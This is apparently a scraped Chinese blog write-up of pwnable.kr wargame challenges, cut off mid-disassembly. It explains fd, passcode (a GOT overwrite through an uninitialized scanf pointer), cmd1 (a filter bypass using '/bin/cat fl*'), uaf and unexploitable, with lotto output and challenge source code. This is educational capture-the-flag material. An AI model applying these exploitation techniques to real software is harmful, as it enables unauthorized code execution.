Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' 14 cmd1 #include #include int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } 代码很短, 主要就是执行system(argv[1])但可以看到该程序把PATH指向了一个显然不能用的路径, 而且我们传入的argv里不能包含flag, sh, tmp, 也就是不能直接或间接地把flag打印出来.\n没有环境变量, 就直接用绝对路径\"/bin/cat\" 不能直接出现flag, 但可以用*通配符啊 所以 ./cmd \"/bin/cat fl*\" 15 cmd2 没做呢\n16 uaf use after free漏洞 源码:\n#include #include #include #include #include using namespace std; class Human { private: virtual void give_shell() { system(\"/bin/sh\"); } protected: int age; string name; public: virtual void introduce() { cout \u003c\u003c \"My name is \" \u003c\u003c name \u003c\u003c endl; cout \u003c\u003c \"I am \" \u003c\u003c age \u003c\u003c \" years old\" \u003c\u003c endl; } }; class Man : public Human { public: Man(string name, int age) { this-\u003ename = name; this-\u003eage = age; } virtual void introduce() { Human::introduce(); cout \u003c\u003c \"I am a nice guy!\" \u003c\u003c endl; } }; class Woman : public Human { public: Woman(string name, int age) { this-\u003ename = name; this-\u003eage = age; } virtual void introduce() { Human::introduce(); cout \u003c\u003c \"I am a cute girl!\" \u003c\u003c endl; } }; int main(int argc, char *argv[]) { Human *m = new Man(\"Jack\", 25); Human *w = new Woman(\"Jill\", 21); size_t len; char *data; unsigned int op; while (1) { cout \u003c\u003c \"1. use\\n2. after\\n3. free\\n\"; cin \u003e\u003e op; switch (op) { case 1: m-\u003eintroduce(); w-\u003eintroduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u003c\u003c \"your data is allocated\" \u003c\u003c endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } unexploitable int __cdecl main(int argc, const char **argv, const char **envp) { char buf[16]; // [rsp+0h] [rbp-10h] BYREF sleep(3u); return read(0, buf, 0x50FuLL); } GOT表里什么都没有, 乍一看好像寄了, 但神奇的地方在于这个read的参数0x50F, 他在内存里是个0x0F05,所以用ROPgadget能找到一个syscall.\n0.虚表 1 2 3\n","wordCount":"3158","inLanguage":"en","image":"https://juicymio.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2022-10-12T17:19:11+08:00","dateModified":"2022-10-12T17:19:11+08:00","author":{"@type":"Person","name":"JuicyMio"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://juicymio.github.io/posts/pwnable.kr/"},"publisher":{"@type":"Organization","name":"JuicyMio's Blog","logo":{"@type":"ImageObject","url":"https://juicymio.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://juicymio.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://juicymio.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://juicymio.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://juicymio.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://juicymio.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://juicymio.github.io/friends/ title=friends><span>friends</span></a></li><li><a href=https://juicymio.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://juicymio.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://juicymio.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Pwnable.kr</h1><div class=post-meta><span title='2022-10-12 17:19:11 +0800 CST'>October 12, 2022</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;3158 words&nbsp;·&nbsp;JuicyMio&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/pwnable.kr.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#1-fd>1 fd</a></li><li><a href=#2-collision>2 collision</a></li><li><a href=#5-passcode>5 passcode</a><ul><li><a href=#实现>实现:</a></li></ul></li><li><a href=#6-random>6 random</a></li><li><a href=#7-input>7 input</a></li><li><a href=#8-leg>8 leg</a></li><li><a href=#9-mistake>9 mistake</a></li><li><a href=#10-shellshock>10 shellshock</a></li><li><a href=#11-coin1>11 coin1</a></li><li><a href=#12-blackjack>12 blackjack</a></li><li><a href=#13-lotto>13 lotto</a></li><li><a href=#14-cmd1>14 cmd1</a></li><li><a href=#15-cmd2>15 cmd2</a></li><li><a href=#16-uaf>16 uaf</a><ul><li><a href=#unexploitable>unexploitable</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=pwnablekr-writeup>pwnable.kr writeup<a hidden class=anchor aria-hidden=true href=#pwnablekr-writeup>#</a></h1><h2 id=1-fd>1 fd<a hidden class=anchor aria-hidden=true href=#1-fd>#</a></h2><p>文件描述符(file descricptor)</p><blockquote><p>维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。</p></blockquote><p>习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>//fd.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=o>&lt;</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;pass argv[1] a number</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=o>-</span> <span class=mh>0x1234</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=s>&#34;LETMEWIN</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;good job :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;learn about Linux file IO</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=o>-</span> <span class=mh>0x1234</span><span class=p>;</span>
</span></span></code></pre></div><p>其中atoi是将字符串转化为整数的函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[]){</span>
</span></span></code></pre></div><p>可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.</p><p>例如运行程序fd</p><pre tabindex=0><code>./fd 4660
</code></pre><p>此时argc值为2, 而argv[0] = &ldquo;./fd&rdquo;, argv[1] = &ldquo;4660&rdquo;</p><p>atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag</p><h2 id=2-collision>2 collision<a hidden class=anchor aria-hidden=true href=#2-collision>#</a></h2><h2 id=5-passcode>5 passcode<a hidden class=anchor aria-hidden=true href=#5-passcode>#</a></h2><p><strong>这题没太懂GOT PLT那里的具体原理</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>login</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>passcode1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>passcode2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter passcode1 : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter passcode2 : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;checking...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>passcode1</span><span class=o>==</span><span class=mi>338150</span> <span class=o>&amp;&amp;</span> <span class=n>passcode2</span><span class=o>==</span><span class=mi>13371337</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Login OK!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Login Failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>welcome</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter you name : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%100s&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome %s!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>        <span class=nf>welcome</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>login</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>// something after login...
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Now I can safely trust you that you have credential :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>容易注意到login函数中这句</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode1</span><span class=p>);</span>
</span></span></code></pre></div><p>本应该为</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>passcode1</span><span class=p>);</span>
</span></span></code></pre></div><p>也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容.
那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符.
用IDA反编译一下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>login</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [esp+18h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter passcode1 : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter passcode2 : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;checking...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v1</span> <span class=o>!=</span> <span class=mi>338150</span> <span class=o>||</span> <span class=n>v2</span> <span class=o>!=</span> <span class=mi>13371337</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Login Failed!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Login OK!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=nf>welcome</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v1</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+18h] [ebp-70h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+7Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter you name : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%100s&#34;</span><span class=p>,</span> <span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome %s!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system("/bin/cat flag")这个指令了.
在IDA里找到他们:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 ; =============== S U B R O U T I N E =======================================
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 ; Attributes: thunk
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 ; int printf(const char *format, ...)
</span></span><span class=line><span class=cl>.plt:08048420 _printf         proc near               ; CODE XREF: login+E↓p
</span></span><span class=line><span class=cl>.plt:08048420                                         ; login+3C↓p ...
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 format          = dword ptr  4
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420                 jmp     ds:off_804A000
</span></span><span class=line><span class=cl>.plt:08048420 _printf         endp
</span></span><span class=line><span class=cl>.plt:08048420
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:08048562 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.text:08048563                 align 4
</span></span><span class=line><span class=cl>.text:08048564
</span></span><span class=line><span class=cl>.text:08048564 ; =============== S U B R O U T I N E =======================================
</span></span><span class=line><span class=cl>.text:08048564
</span></span><span class=line><span class=cl>.text:08048564 ; Attributes: bp-based frame
</span></span><span class=line><span class=cl>.text:08048564
</span></span><span class=line><span class=cl>.text:08048564                 public login
</span></span><span class=line><span class=cl>.text:08048564 login           proc near               ; CODE XREF: main+1A↓p
</span></span><span class=line><span class=cl>.text:08048564
